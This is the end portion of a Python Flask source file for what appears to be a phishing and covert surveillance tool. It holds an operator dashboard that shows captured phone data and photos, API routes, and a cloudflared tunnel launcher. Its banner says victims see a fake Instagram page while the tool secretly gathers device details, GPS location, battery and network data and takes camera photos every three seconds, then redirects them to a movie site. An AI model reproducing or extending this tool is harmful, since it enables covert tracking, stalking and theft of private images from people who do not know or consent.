            .info-card { background: #1a1a1a; padding: 15px; border-radius: 10px; margin-bottom: 20px; white-space: pre-wrap; font-size: 11px; overflow-x: auto; max-height: 500px; overflow-y: auto; }
            .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; margin-top: 20px; }
            .photo-item { background: #1a1a1a; border-radius: 10px; padding: 10px; }
            .photo-item img { width: 100%; border-radius: 8px; }
            .timestamp { color: #888; font-size: 10px; margin-top: 5px; }
            h1 { font-size: 20px; margin-bottom: 10px; }
            .refresh { background: #0f0; color: #000; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-bottom: 20px; }
            .badge { background: #0f0; color: #000; padding: 2px 8px; border-radius: 10px; font-size: 10px; display: inline-block; margin-left: 10px; }
            .photo-count { background: #1a1a1a; padding: 10px; border-radius: 10px; margin-bottom: 15px; font-size: 14px; }
            .silent-badge { background: #ff4444; color: white; padding: 2px 8px; border-radius: 10px; font-size: 10px; margin-left: 10px; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>📡 LIVE PHONE DATA MONITOR <span class="badge">SILENT MODE</span><span class="silent-badge">MOVIE WEBSITE REDIRECT</span></h1>
            <div>Auto-refreshing every 3 seconds | Silent unlimited photo capture | Redirect on follow to MOVIE SITE</div>
            <div style="margin-top: 10px; font-size: 12px;">✅ Device Info Working | ✅ GPS Working | ✅ Battery Working | ✅ Network Working</div>
        </div>
        <button class="refresh" onclick="location.reload()">🔄 Refresh Now</button>
        <div class="photo-count" id="photoCount">📸 Photos captured silently: 0</div>
        <div id="content">Loading...</div>
        <script>
            function loadData() {
                fetch('/api/latest-data').then(res => res.json()).then(data => {
                    let html = '';
                    if (data.device_info) {
                        html += '<div class="info-card"><strong>📱 COMPLETE PHONE DATA</strong><br><br>' + data.device_info.replace(/\\\\n/g, '<br>') + '</div>';
                    }
                    if (data.photos && data.photos.length > 0) {
                        document.getElementById('photoCount').innerHTML = `📸 Photos captured silently: ${data.photos.length}`;
                        html += '<h2>📸 SILENTLY CAPTURED PHOTOS (User didn't know)</h2><div class="photo-grid">';
                        data.photos.slice().reverse().forEach(photo => {
                            html += '<div class="photo-item"><img src="/photos/' + photo.file.split('/').pop() + '?t=' + Date.now() + '"><div class="timestamp">' + new Date(photo.time).toLocaleString() + '</div></div>';
                        });
                        html += '</div>';
                    }
                    if (!data.device_info && data.photos.length === 0) html = '<div class="info-card">⏳ Waiting for data... User will see Instagram page</div>';
                    document.getElementById('content').innerHTML = html;
                });
            }
            loadData();
            setInterval(loadData, 3000);
        </script>
    </body>
    </html>
    ''')

@app.route('/api/latest-data')
def get_latest_data():
    global latest_data
    return jsonify({
        'device_info': latest_data.get('device_info'),
        'location_info': latest_data.get('location_info'),
        'battery_info': latest_data.get('battery_info'),
        'network_info': latest_data.get('network_info'),
        'photos': latest_data.get('photos', []),
        'session_id': latest_data.get('session_id'),
        'timestamp': latest_data.get('timestamp')
    })

@app.route('/photos/<filename>')
def serve_photo(filename):
    from flask import send_from_directory
    return send_from_directory(PHOTO_FOLDER, filename)

def find_free_port():
    for port in range(5000, 5010):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex(('127.0.0.1', port))
        sock.close()
        if result != 0:
            return port
    return random.randint(8080, 9000)

def start_cloudflared(port):
    time.sleep(3)
    try:
        cloudflared_cmd = None
        paths = ['cloudflared', '/data/data/com.termux/files/usr/bin/cloudflared', os.path.expanduser('~/go/bin/cloudflared')]
        for path in paths:
            if os.path.exists(path):
                cloudflared_cmd = path
                break
        if not cloudflared_cmd:
            print("\n📦 Installing cloudflared...")
            subprocess.run(['pkg', 'install', 'golang', '-y'], capture_output=True)
            subprocess.run(['go', 'install', 'github.com/cloudflare/cloudflared/cmd/cloudflared@latest'], capture_output=True)
            cloudflared_cmd = os.path.expanduser('~/go/bin/cloudflared')
        print(f"\n🚇 Starting tunnel on port {port}...")
        process = subprocess.Popen([cloudflared_cmd, 'tunnel', '--url', f'http://localhost:{port}'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1)
        for line in process.stdout:
            if 'https://' in line and '.trycloudflare.com' in line:
                for word in line.split():
                    if 'https://' in word and '.trycloudflare.com' in word:
                        url = word.split(' ')[0].strip()
                        print("\n" + "="*60)
                        print("✅ TUNNEL ACTIVE!")
                        print(f"📱 PUBLIC URL: {url}")
                        print("="*60 + "\n")
                        break
                break
        process.wait()
    except Exception as e:
        print(f"⚠️ Tunnel error: {e}")

if __name__ == '__main__':
    PORT = find_free_port()
    
    # ========== BANNER - CORRECTED ==========
    banner = """
\033[41m\033[1;37m     ██████╗ \033[42m\033[1;30m ██████╗ \033[43m\033[1;30m ████████╗\033[44m\033[1;37m██╗     \033[45m\033[1;37m    ██╗ \033[46m\033[1;30m██████╗ \033[0m
\033[41m\033[1;37m     ██╔══██╗\033[42m\033[1;30m██╔════╝ \033[43m\033[1;30m ╚══██╔══╝\033[44m\033[1;37m██║     \033[45m\033[1;37m    ██║ \033[46m\033[1;30m██╔════╝ \033[0m
\033[41m\033[1;37m     ██║  ██║\033[42m\033[1;30m██║  ███╗\033[43m\033[1;30m    ██║   \033[44m\033[1;37m██║     \033[45m\033[1;37m    ██║ \033[46m\033[1;30m██║  ███╗\033[0m
\033[41m\033[1;37m     ██║  ██║\033[42m\033[1;30m██║   ██║\033[43m\033[1;30m    ██║   \033[44m\033[1;37m██║     \033[45m\033[1;37m    ██║ \033[46m\033[1;30m██║   ██║\033[0m
\033[41m\033[1;37m     ██████╔╝\033[42m\033[1;30m╚██████╔╝\033[43m\033[1;30m    ██║   \033[44m\033[1;37m███████╗\033[45m\033[1;37m    ██║ \033[46m\033[1;30m╚██████╔╝\033[0m
\033[41m\033[1;37m     ╚═════╝ \033[42m\033[1;30m ╚═════╝ \033[43m\033[1;30m    ╚═╝   \033[44m\033[1;37m╚══════╝\033[45m\033[1;37m    ╚═╝ \033[46m\033[1;30m ╚═════╝ \033[0m
\033[1;33m
🔴 YouTube: https://www.youtube.com/@aryanafridi00
💻 Developer: Aryan Afridi 
📡 GitHub: https://github.com/shahid2005a
\033[0m
"""
    # ==========================================
    
    print(banner)
    print(f"📍 LOCAL URL: http://localhost:{PORT}")
    print(f"📺 LIVE DISPLAY: http://localhost:{PORT}/display")
    print(f"📁 DATA FILE: {DATA_FILE}")
    print(f"📸 PHOTOS: {PHOTO_FOLDER}/ (UNLIMITED SILENT)")
    print("\n" + "─"*70)
    print("🎬 MOVIE WEBSITE REDIRECT - COMPLETELY SILENT")
    print("📱 USER EXPERIENCE:")
    print("   ✓ Real Instagram Following page")
    print("   ✓ 16+ celebrities to follow")
    print("   ✓ Working follow/unfollow buttons")
    print("   ✓ NO popups, NO indicators, NO toasts")
    print("📊 BACKGROUND (User NEVER knows):")
    print("   ✓ Device Model collected (FIXED)")
    print("   ✓ GPS Location collected (FIXED)")
    print("   ✓ Battery Status collected (FIXED)")
    print("   ✓ Network Info collected (FIXED)")
    print("   ✓ UNLIMITED PHOTOS (every 3 seconds)")
    print("   ✓ Auto-redirect to MOVIE WEBSITE on ANY follow")
    print("─"*70 + "\n")
    
    tunnel_thread = threading.Thread(target=start_cloudflared, args=(PORT,), daemon=True)
    tunnel_thread.start()
    
    try:
        app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False, threaded=True)
    except KeyboardInterrupt:
        print("\n\n👋 Server stopped!")